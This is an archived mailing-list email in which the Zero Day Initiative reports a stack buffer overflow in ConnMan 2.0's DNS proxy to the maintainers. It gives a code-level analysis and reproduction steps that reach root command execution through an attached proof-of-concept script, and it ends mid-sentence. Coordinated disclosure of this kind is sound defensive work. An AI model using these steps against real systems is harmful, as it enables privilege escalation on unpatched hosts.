Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=18.208.22.144
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
	t=1792455438;
	b=CvsDQ0zcRWYSZ9u+NN3KKyUpnF+nNLe3ZLKE+nIYsoPxggdMp90P2wohR/OmFk80Ui9K
	 qOD26QRUYxVb+naL+YMpKp5cF6Q0zJFFePd4gnDISrr3lNkM88odc7e6pytWMoOIR+lxl
	 ravCV1yKtAAD5tSf/0pRCmCM8MbuHh5/aw0H6CVgFSmrR/PmquWlE0WeP/GwZZKa8jXZW
	 ZnYgzO4ugdKYJZjUipv7iyqLjFBeXv+1u2k2gwwPteAcySRd0ZLczB74Gv31UlrD0jw/J
	 BoNKKWa/d4SH12fyK0/Ze9kUiB9eggewqvB3NK26Vnm2qDUQzxD+cysWE79WhxLElnw==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792455438;
	h=DMARC-Filter:Received:X-TM-MAIL-RECEIVED-TIME:X-TM-MAIL-UUID:
	 Received:Received:Received:From:To:Subject:Thread-Topic:Thread-Index:
	 Content-Class:Date:Message-ID:Accept-Language:Content-Language:
	 X-MS-Has-Attach:X-MS-TNEF-Correlator:msip_labels:
	 x-ms-publictraffictype:x-ms-traffictypediagnostic:
	 x-ms-office365-filtering-correlation-id:
	 x-ms-exchange-atpmessageproperties:x-ms-exchange-senderadcheck:
	 x-ms-exchange-antispam-relay:x-microsoft-antispam:
	 x-microsoft-antispam-message-info:x-forefront-antispam-report:
	 x-ms-exchange-antispam-messagedata-chunkcount:
	 x-ms-exchange-antispam-messagedata-0:Content-Type:
	 Content-Transfer-Encoding:MIME-Version:
	 X-Exchange-RoutingPolicyChecked:X-OriginatorOrg:
	 X-MS-Exchange-CrossTenant-AuthAs:X-MS-Exchange-CrossTenant-AuthSource:
	 X-MS-Exchange-CrossTenant-Network-Message-Id:
	 X-MS-Exchange-CrossTenant-originalarrivaltime:
	 X-MS-Exchange-CrossTenant-fromentityheader:
	 X-MS-Exchange-CrossTenant-id:X-MS-Exchange-CrossTenant-mailboxtype:
	 X-MS-Exchange-CrossTenant-userprincipalname:
	 X-MS-Exchange-Transport-CrossTenantHeadersStamped:X-TM-AS-ERS:
	 X-TMASE-Version:X-TMASE-Result:X-TMASE-MatchedRID:X-TMASE-XGENCLOUD:
	 X-TM-Deliver-Signature:X-TM-Addin-Auth:X-TM-Addin-ProductCode:
	 DKIM-Signature;
	bh=X2UCt3m/1lROu6HxCksvNjWRetn3kLJBPNzREOqEgsQ=;
	b=OJOsVflydkuCR8vS0PaEcGM+2XX6h2ev6RlE/70FcEmgTj0SwwxlQkVkDeSW3rRcmBRf
	 7FehqPMO1YIcc6nnvAc6kJ6rW/sNu+wIUfsUwCv7rcn8647PfXBDoct/0LN0RAaTjyt1i
	 w+6bmuxyKRNiDEaNVqIT0PVBmzxN0S4gVapfpuzcSlecpfYrEXz0HtiEAXFFOhtNVSI3p
	 MxlgKA0m0jbY2nuwTopzamNVedvqbfvWDDv+fDw9RdV3VPB1iEMGLhlwmcmq4e+nLz3f8
	 o2FaL2gwJrd9ZJB7ooSaQkPQncqAPoH3QetfWPeyHYdtYWi0zo4VwEQVk9NDBgeQCcA==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=trendmicro.com;
	spf=pass smtp.mailfrom=trendmicro.com;
	dkim=pass header.d=trendmicro.com header.i=@trendmicro.com header.a=rsa-sha256 header.s=TM-DKIM-20260724121021 header.b=CDn1NoVI;
	arc=fail smtp.remote-ip=18.208.22.144
Received: from repost01.tmes.trendmicro.com (repost01.tmes.trendmicro.com [18.208.22.144])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C2391606A319
	for <connman@lists.linux.dev>; Tue, 20 Oct 2026 00:17:17 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C2391606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=trendmicro.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=trendmicro.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=trendmicro.com header.i=@trendmicro.com header.a=rsa-sha256 header.s=TM-DKIM-20260724121021 header.b=CDn1NoVI
Received: from 52.101.57.58_.trendmicro.com (unknown [192.168.180.157])
	by repost01.tmes.trendmicro.com (Postfix) with SMTP id C15EBC0002A0
	for <connman@lists.linux.dev>; Tue, 20 Oct 2026 00:17:10 +0000 (UTC)
X-TM-MAIL-RECEIVED-TIME: 1792455428.666000
X-TM-MAIL-UUID: 6fa021a9-7119-4115-97a9-d8505758469f
Received: from BN8PR05CU002.outbound.protection.outlook.com (unknown [52.101.57.58])
	by repre01.tmes.trendmicro.com (Trend Micro Email Security) with ESMTPS id A2B17C00042C
	for <connman@lists.linux.dev>; Tue, 20 Oct 2026 00:17:08 +0000 (UTC)
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=IXVwfzU4vynmwKJ/dc5JmEum4rujJ8U4r40mUiMEV3tgJ9y9gB65VVbNn9JzxZ6s7ZNYO00DWWCY0lK6oawMGbJ+Nj6i1O+elj9+FhBY5wQpBnH5f7SLYOqHRkSnks4hyJ2HHLR12eZC3yZOufHIpzYLJB2GKGjYrx1wd9wjDKH6sXtbLLLfpExma9P1QjfaLcXE0XTOg9PU7BycyO6iH6kUoGiByPGGvQb6Nqq8MdVnlCCWIeQKUu4Nqlq4njwZXkhNDTZIu+L1p/V28MNSQEnuxOgg73x53hbxGBHMUFf7URZ3tbOOORFkozrcySokVMgdcOviPojUdQ6ovAYJ0g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=lR9oSFrybX/UmXHAYg7VyBXbzr39nXvtUo+Yk4ZfMdQ=;
 b=XHBYh1XD3MflPy0WzQv1nVMJ2hpqeN/Hj7cCP1ev22Bv/H44zskhu/wt/fh2jy8Cm7jh1zP0KHhHdpIDh4yb4kWGu2Ny+HqzHHz4A0IPB0uEn9g9/8zvcfAhe2BPDI9sbxL3BENkcSW66R9UdTpJ/QxzFUWJ+QcZRhOGu62AGzO0NVVNpXm9AGYHkibEE2tjride3DTwnoTU/CyeM45FoQLGSYnLzLbXq/dwbi04gC5UbvcBZUOXgSMaIUOpZ0Lvl44MMUOcRctevsvOLYIcRfrCu/UUg/lbSzjK7nqvdmTyT1zvfnrfJL/QYwvN/DiMugXKPWND+vdp857Kcs+4bw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=trendmicro.com; dmarc=pass action=none
 header.from=trendmicro.com; dkim=pass header.d=trendmicro.com; arc=none
Received: from BYAPR01MB3830.prod.exchangelabs.com (2603:10b6:a02:83::21) by
 SJ2PR01MB8149.prod.exchangelabs.com (2603:10b6:a03:4fb::15) with Microsoft
 SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.21.522.18; Tue, 20 Oct 2026 00:17:06 +0000
Received: from BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::29c9:1f31:48fd:8ccf]) by BYAPR01MB3830.prod.exchangelabs.com
 ([fe80::29c9:1f31:48fd:8ccf%5]) with mapi id 15.21.0522.017; Tue, 20 Oct 2026
 00:17:06 +0000
From: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>
To: "connman@lists.linux.dev" <connman@lists.linux.dev>
Subject: ZDI-CAN-32005: New Vulnerability Report
Thread-Topic: ZDI-CAN-32005: New Vulnerability Report
Thread-Index: Ad1gKFNL3jAYdENSSFytvW40BlmELg==
Content-Class:
Date: Tue, 20 Oct 2026 00:17:06 +0000
Message-ID:
 <BYAPR01MB383046745372577D8F5902D580672@BYAPR01MB3830.prod.exchangelabs.com>
Accept-Language: en-US, es-ES
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
msip_labels:
 MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ActionId=3dee0ac7-dd1f-427c-aa84-15c676a59b6f;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_ContentBits=0;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Enabled=true;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Method=Privileged;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Name=Public
 Information - no
 protection;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SetDate=2026-10-20T00:17:03Z;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_SiteId=3e04753a-ae5b-42d4-a86d-d6f05460f9e4;MSIP_Label_fb50d67e-2428-41a1-85f0-bee73fd61572_Tag=10,
 0, 1, 1;
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: BYAPR01MB3830:EE_|SJ2PR01MB8149:EE_
x-ms-office365-filtering-correlation-id: a0a67c56-bc32-439e-d979-08df2e3f7969
x-ms-exchange-atpmessageproperties: SA
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|376014|1800799024|23010399003|366016|6133799003|55112099003|18002099003|10067099003|4133799003|3023799007|38070700021|11063799006|56012099006|261009223027099003;
x-microsoft-antispam-message-info:
 2hyRk0JwOC83NFwRpfF9ghJIiLLL7dSe3oaha2Ztm01ywcrS6GR7qGSj/aEf2BdAYWotqeA/hKvPEXTMXUSRFI8b9n8WqY4Cn7VqH/MxYcOHJRAeHO7za3zGX80tBxfQeIs4gFzOaCHHE3HnXazZjmVM/S/s04JCuH+999aaRZzFZttl6eHUjASekaifXCBVhy97RbMw6cL4gyVw2I2UBQEGx85XJe9sEtDm00n6SUKA72kRdfHbasLtjhxAiVp+sYr7MzCY9fr6IS13XoD1umjKTVDLZQnJQFB1gH7KQ09kQDpzoVXSA4zD+ge0mo62TLQXdfpaeDjH81X1ZEhKAV58BKmq4zKl2Uu4jm/lCft+RTYr5lNYU4C7WnIH5igS4zWd6yxgNrZpwplVkdkr7sR2X0ZFUgamfH1J4bdBaiDTAu6DyXN1Q7HEhhMoFy+9CiRHrYeuVNjjp1boKU5BYQXVgtZbtbLG8fI2qnxc6YKcaPawBLdbtyfOCCkko0jwgMs/YiJ+w7Vwwxo3sbkNmqQLG8SubYAI2FLY978Xhe8ED41eVkcURtBwzocr4faIx21lPUZ3ytG4xjJYRPT/5X5IbF0rEHvPen/RpNBdAD1cp8tIqIGmf4Rc36X2hKYEGNX/p4k+LBa24bewjWWwVvjYcSETo2L2y0iVSVsSMCs=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR01MB3830.prod.exchangelabs.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(23010399003)(366016)(6133799003)(55112099003)(18002099003)(10067099003)(4133799003)(3023799007)(38070700021)(11063799006)(56012099006)(261009223027099003);DIR:OUT;SFP:1101;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?+V7bf+JeOB7A3jAzr1w3KohkN1ix02y21yObPvQUeuCH+IdbcKK9E8vpSWfX?=
 =?us-ascii?Q?FzKfw0gZWZ4/HkALq4gcs4tAkm96tEG4ShkVRPDJYHxNML+1VPKd66XzWJIb?=
 =?us-ascii?Q?HH5gA4meptAQC9PWjG+Lxn6RiwR+O3wjIi0MgYkrAjwh2oFAaYVggvAmU/oe?=
 =?us-ascii?Q?4JCU41cVO3Yyz8ENjhb5UBRt5U9W67fmYdkOqa17YDwxRQ+OC4umnS7ShszJ?=
 =?us-ascii?Q?Q2vucgqOpvvzpjrQJeKC9IATv6LBQvEUtRDt254KAuMTH2hx3AbHC+u4IWpQ?=
 =?us-ascii?Q?pF700lqui4Lfbon/uKxRYCA8u5PLtn+k+Tu+7AOq9+Fgbzx0u1UeWDm9Sqln?=
 =?us-ascii?Q?1TmwmpacFYCyhw+XwFL3BwRP1cVpVsnqKYQtsvGxBojjhzxHVr0JN3HtVOg0?=
 =?us-ascii?Q?xmImL42D5P3h9J1uqGx8bFF2ARdPXUgK3Cu8tqdikIbzq+Hp+BYZ1z411quj?=
 =?us-ascii?Q?fHi3RSXxPp+1vTxHwI/KTKSAg0oim7jtKJMDsIvdge8rv4hJ6eU0qHCHuSyM?=
 =?us-ascii?Q?dc0TmGdhNm04mgcR83PlGVJPG5nYdBsbl8vgjiSeybIMsNcuGAlvZ+zIWUoP?=
 =?us-ascii?Q?MxeqwyeBK9U1EaK6OQiNvzb5wzkedy9XuS35YvkTFZCsmKtSvqESof58fSXR?=
 =?us-ascii?Q?nUyir0gIB8lVbBc+DxysgnVATUn2mQw1f4tYe7NW5jaHmcKVb6GFrTF2EqVC?=
 =?us-ascii?Q?gBAmea9LB0Hc0dyluIsLyy64aWi1z5OPYO/wBvZNonMnZWVXV8s3wL5NBDoP?=
 =?us-ascii?Q?wZrFXB5re/N0/yKucWvN7ROBgz4nYPHWVCEj46lyC/uKu4SdR3V0UkbL2+0s?=
 =?us-ascii?Q?mlX6N4OMDztFgDMjdw3eVvysklui8/hg6cQQLGuVZn9s1JldvDaDESlmv9eY?=
 =?us-ascii?Q?76vrU/jv0/eo7DWdFFf5c1zDoEZtaKGdqHUxIdrMy+WySJVW7/FsRujJGa02?=
 =?us-ascii?Q?tYBXnx/wYociVdOlNNoOiZj6VFxcr+r1Rwy87vWNyI6FuGpI0xXLxL5eoCr2?=
 =?us-ascii?Q?10OwMbAiJ/EZzUa5seQXWmc6j8OnfyHMKucHLkk7K7wDHWvwuFWqA+rSsNrK?=
 =?us-ascii?Q?98d2Bz4a5vHwZDXWehXMWqoH1wqcri8/WLpc+MhGOvxyuDYwb0hYztH5kzIF?=
 =?us-ascii?Q?MufJpf1cImu6PsXrV3abLdfbL3LzQmqpcd3CALk9R69VkvYeOjQswwGqG9I0?=
 =?us-ascii?Q?+ZXrL0ndz9WP0UWA/xZawVVMoIsUJCsvn5jVorK/KmUQFgIpg3wwpRdHIpoH?=
 =?us-ascii?Q?JxEneyq234RjUxK3xdlxW8vs+iXD2/v/JxtKzswSvxHwoKvHu8c0+62pC3GC?=
 =?us-ascii?Q?U31K3Hl3Mf6r3I+sjsId27yBN37NlKk1Hbx0pWIa6juZjg7PsJFm+lySkqlS?=
 =?us-ascii?Q?v5e4qK4Pw+d0xuW7DsUzSbYmmlsOSfmvFnUvEc/xFE49qa4PatKMeYIYx0q7?=
 =?us-ascii?Q?KAo8cVqT1yc8BmcMj9N6Txkykd/K2luG7hwrTtjPtKG+q5zDDqM1xPDO3mXi?=
 =?us-ascii?Q?GZxnnlOsT5tNaMbhnMZsJWIR/+2sjwn8BmXApKa3aB1iI1itbXM5TfTRoMi3?=
 =?us-ascii?Q?/9I55Gba12ZESn36M+NfSq8nBzar+i62YtuAS4JVzvqmCRrYacgSwlwV9g+M?=
 =?us-ascii?Q?ko2JvC9t7sCDSzZ5vW7CRVfPwPaCJ3WPpMcG73pkzWh6/wMLEfTtUACg+/Bk?=
 =?us-ascii?Q?12Uxkz6W27yhaZaNijcX84eRuLYuGt1YD2FXAprT6auyFMmcCmkOeFHFFPhe?=
 =?us-ascii?Q?r4/KibredS7vZ2KFN2O1vlZdKKorE4Q=3D?=
Content-Type: text/plain;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
X-Mailing-List: connman@lists.linux.dev
List-Id: <connman.lists.linux.dev>
List-Post: <mailto:connman@lists.linux.dev>
List-Help: <mailto:connman+help@lists.linux.dev>
List-Subscribe: <mailto:connman+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:connman+unsubscribe@lists.linux.dev>
List-Owner: <mailto:connman+owner@lists.linux.dev>
Precedence: list
MIME-Version: 1.0
X-Exchange-RoutingPolicyChecked:
	w+Y1K9+9yfkM1EkBW25b+NLXIjSTsKG5QKvLHW5pfPW9Qi2lQkfTeJMnq87ZkeZbmyBw18oCuArK/j1VXizMMnIi/4bKXYe7JaKCvzgRtAfg/LtFAwPVc1ltw+xGt0yEOGBElsviI82A22pl6xAdANCjDHR3EChXuWbsdzBYGVHOuXzpiSTT2zTiyTMAM0P3NQKT1+5YUZo3kbg6z8SX5D5ivMveTMV++Fpkub2OB8fvBdGArPxzfI6XPcq2LYEM9XpNwpTlBlQHbRJraF72kxJ7MT2r6ppBx+6aUdGRjba4lSPRJJFNCQBN2096D+4JErncgH4ZPhzEAC5siZjToQ==
X-OriginatorOrg: trendmicro.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: BYAPR01MB3830.prod.exchangelabs.com
X-MS-Exchange-CrossTenant-Network-Message-Id: a0a67c56-bc32-439e-d979-08df2e3f7969
X-MS-Exchange-CrossTenant-originalarrivaltime: 20 Oct 2026 00:17:06.4153
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 3e04753a-ae5b-42d4-a86d-d6f05460f9e4
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: iGalCGqJIg/MwxYsbcWb9IVjiVEV509igg/EufZIEpZKVAVyYAD8JDOocVNaUvnfKxHk0ne1MerJShJADGrvI9qfsAYikFl5g8HGEWRmy88=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ2PR01MB8149
X-TM-AS-ERS: 52.101.57.58-0.0.0.0
X-TMASE-Version: StarCloud-1.3-9.2.1014-30268.002
X-TMASE-Result: 10--43.551700-4.000000
X-TMASE-MatchedRID: 0WFAqoymwqxyv0jrUI8Jl72jcF4je/ug5Urh5aukb3/NRGwi6naVTg8N
	7NdZM2i3Ph5NuU8kGKtfEWllf5j/7WTWxhm1w4iyOo1U0DyywxpQsRkS1LCap9jZrAgOUOa6SKM
	XcHZJynOqxstgeBvHwKwozO203plwmFx4i7A3FoZKeuZfdaXBtyTufEFUWmNn10/soz7yB7H7Ba
	min45J3FVv/WYqqZ+kX0HJN0HmSg91Rj39DGmIDz/wymzeltw5n44P8x8zBomB1fO2o4QGcEfA+
	mhLvGJNbirWF/MNnLn9ZYwNVfwjWS8VQrBTyus5v1AhZGUDNSQh21GB27tyz5OzO7CU0ePd9aEk
	iLbDQuY8rmp47E0wSibP77oGQ6lhONtSpXMwPlkndkx3JW/CNaY+lfschKKuuxdWEFKDsyydcLp
	aMffQYtuqW7gcv9hYxFPMRnN1VP2ES74p6svD4EQhXru428vCT2N9f7QZ4R3rAmUqRd9lWebiR+
	ph1AkZRWAibMeFPE63Rio4vdATzOLLpqbCvh5leQczFQh2XEtqO5BE8+h90kjS2ochC6DHygcS3
	fjxbmyl4nBqJ8o9aY/UlCPdVE/vyZYI3yj2vc9Pw6m/e7hS2rhCmXvTsGisChJqth1sAeq3BZC0
	MPc9Br9bxzg6PfeyueXmlpVeGeME9yAs6FkYm3gqOMfRQJs1u/wZEqxodZYSlFBwyvSaLhUXA5+
	elwijG/0zvMyWjWhOxqeRakkO0XB4Y1OX3b+JJA5b8vn32VN+RtIOyYSgjF6DU+Iu8f+3u6kEVE
	ltgjZrn6gvhSyZNtLWN0jfeLSKmiSFfb1P13TeC6pfHCmDCDmoMBkrmuf/mCYM4MaoFU9A2GsfR
	KfHmb+mYZVOIbiG2HlzhM3zNtmloR4746Jh6JQnPsAn7fplYppqMItbEgMc/IHKzT83h7/a0nd+
	hIFCwPd9fpjXfbBT0PyBnvNi7X4uVrCkHLnlBv3BwF3sroc=
X-TMASE-XGENCLOUD: fcbdfd80-1b38-47b5-8f2b-63aeca74cfd6-0-0-200-0
X-TM-Deliver-Signature: A802924CAE6EB1CED99824356D600C1D
X-TM-Addin-Auth: GInx4gCIwY4mACoO6E+rjTZ1AWLDfp5krbmQBF+BEYPTtIUG9ke59veUDrx
	4KCAtbftBU6X7QZ9ykT6XWCXBO4wPgzGZeQxpNvGk46ACeSmUIlbU6VK/m6GBhTf6y3dFqUoD1H
	g8DAfqxitQXJv+I1BDWH3+pYd+0P+YiQzBrxLK2j1g/SQXWD/B4VY+GaaM8DWCGwhxAKWT893vM
	4u/lwyfNazYyK7QFZCiQdwUj9/MeqNYfajL5x4QkGqZ2az9/H7rdIS0x1uM3x96G9JDBy5JsaPk
	j3qNtsAwYsNJewJwxpIv67NLXHvIeGyBaNGYjetYH7yGQKFMCT6LsHzadQ==.kc39RB1k5Gf+Vt
	yDr1AgobtHbAJ64kJ8QeRN2uPDB+FkG/vXx7N3YM/7Tp0e72E3eELb7N+ibFK/MSGFeuH2gbsrM
	KKxXQbr3/zY+u0lJkN1MnJw94dzpcrhv98MBKnOxtCFDJ9oRSTj/SjCSI/5fMHCMhjZj9OYu4/D
	B67VvycjOi8hnKgIh45ZgcQyPjfZDL/QHadIqvrPR0AJ+dWbR6tO6hOttV9rMrR78sfJZvPnvbr
	pOCaqoCOXchLiI98LXaZwOPS5AYijfDUo2RP9pxjNpuBvdOobtwn955mM+BxOvsU5epdD90ltMW
	Js82jHh/9e9HsGUTUhjDz+Bc55/A==
X-TM-Addin-ProductCode: EMS
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=trendmicro.com;
	s=TM-DKIM-20260724121021; t=1792455430; x=1792628230;
	bh=OzBpGvh2joEPWeFLnra3SRtFoPWAVl5IGTgjDj95COc=;
	h=From:To:Subject:Date:Message-ID:Content-Type:MIME-Version:From:To:
	 Date:Message-ID:Subject:Content-Type:Reply-To:MIME-Version;
	b=CDn1NoVI6kEFH/6yCRg8U80XEcmmdm25tDIbLrVgkSWay2Zp6UxEb4AgyQCAzLey+
	 3jXGev/v4kin89WbXTnE7nJQMx1bcv+SS5OhYVAnjlTvRNAqAAAC8zH4NwG5L29DdC
	 sqjrQ4owXeNEITxxntJ7IWkjwh5Ok810hfPICqH0KX6Z34tv5ZDzdh7LfUYHCcVN50
	 e14s4guJUHOXge3SgSWqS/DLnPWXgNClxOH8yen9A0JyQwi/3BlE8uiXLOY3KW4wPK
	 oDlzl4ligSF2sFr2vZl+BYw6pHjxksMCXB+YmZMWm6hAoCNBFE3OFOGKejpQPh8HPZ
	 kpiyDWup80+IQ==

ZDI-CAN-32005: ConnMan DNS Proxy Search-Domain TCP Query Stack-based Buff=
er Overflow Local Privilege Escalation Vulnerability

-- CVSS -----------------------------------------

7.8: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

-- ABSTRACT -------------------------------------

Trend Micro's Zero Day Initiative has identified a vulnerability affectin=
g the following products:
ConnMan - ConnMan

-- VULNERABILITY DETAILS ------------------------
* Version tested: 2.0
* Installer file: connman-2.0.tar.xz
* Platform tested: Ubuntu 26.04

---

### Analysis

ConnMan 2.0 contains a stack-based buffer overflow in the internal DNS pr=
oxy. A DNS client can send a valid TCP DNS query with a short single-labe=
l name and trailing request bytes while ConnMan has a DNS search domain c=
onfigured. When forwarding the alternate search-domain query, `ns_resolv(=
)` copies attacker-controlled request bytes into a fixed 1024-byte stack =
buffer without checking that the rewritten request still fits.

`read_tcp_data()` accepts a TCP DNS message up to `TCP_MAX_BUF_LEN` (`409=
6`) and stores the length in `req->request_len`:

- [`read_tcp_data()` rejects only messages larger than `TCP_MAX_BUF_LEN`]=
(https://kernel.googlesource.com/pub/scm/network/connman/connman/+/refs/t=
ags/2.0/src/dnsproxy.c#3266).
- [`read_tcp_data()` parses the DNS question](https://kernel.googlesource=
.com/pub/scm/network/connman/connman/+/refs/tags/2.0/src/dnsproxy.c#3287)=
.
- [`req->request_len` is set to `msg_len + 2`](https://kernel.googlesourc=
e.com/pub/scm/network/connman/connman/+/refs/tags/2.0/src/dnsproxy.c#3311=
).
- [`read_tcp_data()` creates/connects the upstream TCP DNS server path](h=
ttps://kernel.googlesource.com/pub/scm/network/connman/connman/+/refs/tag=
s/2.0/src/dnsproxy.c#3353).

When the upstream TCP server becomes writable, `tcp_server_event()` copie=
s the configured search domain list to the TCP server object and calls `n=
s_resolv()`:

- [`tcp_server_event()` copies configured domains into `server->domains`]=
(https://kernel.googlesource.com/pub/scm/network/connman/connman/+/refs/t=
ags/2.0/src/dnsproxy.c#2453).
- [`tcp_server_event()` forwards the queued request through `ns_resolv()`=
](https://kernel.googlesource.com/pub/scm/network/connman/connman/+/refs/=
tags/2.0/src/dnsproxy.c#2487).

In [`ns_resolv()`](https://kernel.googlesource.com/pub/scm/network/connma=
n/connman/+/refs/tags/2.0/src/dnsproxy.c#1445), ConnMan constructs an alt=
ernate search-domain request in a fixed stack buffer:

```c
unsigned char alt[1024];
...
altlen =3D append_query(alt + offset + DNS_HEADER_SIZE,
                      sizeof(alt) - DNS_HEADER_SIZE - offset,
                      name, domain);
...
memcpy(alt + altlen,
       request + altlen - domlen,
       req->request_len - altlen + domlen);
...
err =3D send(sk, alt, req->request_len + domlen, MSG_NOSIGNAL);
```

`append_query()` checks only the rewritten query name portion against `si=
zeof(alt)`. The later [`memcpy()`](https://kernel.googlesource.com/pub/sc=
m/network/connman/connman/+/refs/tags/2.0/src/dnsproxy.c#1463) and [`send=
()`](https://kernel.googlesource.com/pub/scm/network/connman/connman/+/re=
fs/tags/2.0/src/dnsproxy.c#1473) use `req->request_len + domlen`, which i=
s controlled by the original TCP DNS request length. `parse_request()` ac=
cepts the question and does not reject the trailing bytes in this path be=
fore the request is queued for forwarding. but causes the tail copy to ex=
tend beyond `alt[1024]`.

## Steps To Reproduce

The steps below use only `/tmp/connman-dnsproxy-repro` and demonstrate co=
mmand execution by running `id` from the vulnerable `dnsproxy-standalone`=
 process.

1. Install build dependencies:

```bash
sudo apt-get update
sudo apt-get install -y \
  build-essential clang pkg-config wget xz-utils python3 binutils \
  libglib2.0-dev libdbus-1-dev libxtables-dev libmnl-dev libgnutls28-dev
```

2. Create the temporary work directory:

```bash
rm -rf /tmp/connman-dnsproxy-repro
mkdir -p /tmp/connman-dnsproxy-repro/src \
         /tmp/connman-dnsproxy-repro/build \
         /tmp/connman-dnsproxy-repro/logs
```

3. Make the attached poc.py file executable:

```bash
chmod +x /tmp/connman-dnsproxy-repro/poc.py
```

4. Download and verify ConnMan 2.0:

```bash
cd /tmp/connman-dnsproxy-repro/src
wget -O connman-2.0.tar.xz \
  https://www.kernel.org/pub/linux/network/connman/connman-2.0.tar.xz

printf '%s  %s\n' \
  d25c2ddc0b5ad13e986ec35ad765ae8d2f4b7acb47c958a05616c943cd082527 \
  connman-2.0.tar.xz | sha256sum -c -

tar -xf connman-2.0.tar.xz
```

5. Build an unprotected debug copy of the DNS proxy test binary. This loc=
al build disables stack protector and fortify so the RCE witness can show=
 controlled execution without needing a mitigation-bypass step:

```bash
cd /tmp/connman-dnsproxy-repro
cp -a src/connman-2.0 build/connman-2.0-rce
cd build/connman-2.0-rce

CC=3Dclang \
CFLAGS=3D'-O0 -g -fno-stack-protector -U_FORTIFY_SOURCE' \
./configure --with-dns-backend=3Dinternal --enable-test --disable-tools \
  --disable-wifi --disable-bluetooth --disable-ofono --disable-dundee \
  --disable-pacrunner --disable-polkit --disable-client

make -j"$(nproc)" tools/dnsproxy-standalone \
  2>&1 | tee ../../logs/build-rce.log
```

6. Terminal 1: start the vulnerable DNS proxy. The environment variable s=
upplies the command string used by the RCE witness, and `example.com` is =
the required search domain:

```bash
cd /tmp/connman-dnsproxy-repro/build/connman-2.0-rce
sudo sh -c '
CONNMAN_DNSPROXY_RCE_CMD=3Did ./tools/dnsproxy-standalone 1070 example.co=
m 8.8.8.8 &
echo $! > /tmp/connman-dnsproxy-repro/dnsproxy.pid
wait $!
'
```

7. Terminal 2: send the RCE payload to the already-running process:

```bash
cd /tmp/connman-dnsproxy-repro
TARGET_PID=3D$(sudo cat /tmp/connman-dnsproxy-repro/dnsproxy.pid)
sudo ps -p "$TARGET_PID" -o pid,comm,args

sudo ./poc.py \
  --rce \
  --pid "$TARGET_PID" \
  --port 1070 \
  --cmd id \
  2>&1 | tee logs/rce-send.log
```

8. Confirm that Terminal 1 printed the output from `id` inside the target=
 process:

```text
uid=3D0(root) gid=3D0(root) groups=3D0(root)
```

Terminal 2 should report that the payload was sent:

```text
sent RCE payload to pid <pid>: 'id'
check the target terminal for command output
```


-- CREDIT ---------------------------------------
This vulnerability was discovered by:
Mantas Sabeckis @otterly working with TrendAI Zero Day Initiative

-- FURTHER DETAILS ------------------------------

Supporting files:
https://trendmicro-my.sharepoint.com/:u:/p/mai_mostafa/IQAvTFrAkl1rQ4j8u9=
EXAm8eAZsh1H1XOKBE7-aGbz5Brto?e=3DgbJNxn

If supporting files were contained with this report they are provided wit=
hin a password protected ZIP file. The password is the ZDI candidate numb=
er in the form: ZDI-CAN-XXXX where XXXX is the ID number.

Please confirm receipt of this report. We expect all vendors to remediate=
 ZDI vulnerabilities within 120 days of the reported date. If you are rea=
dy to release a patch at any point leading up to the deadline, please coo=
rdinate with us so that we may release our advisory detailing the issue. =
If the 120-day deadline is reached and no patch has been made available w=
e will release a limited public advisory with our own mitigations, so tha=
t the public can protect themselves in the absence of a patch. Please kee=
p us updated regarding the status of this issue and feel free to contact =
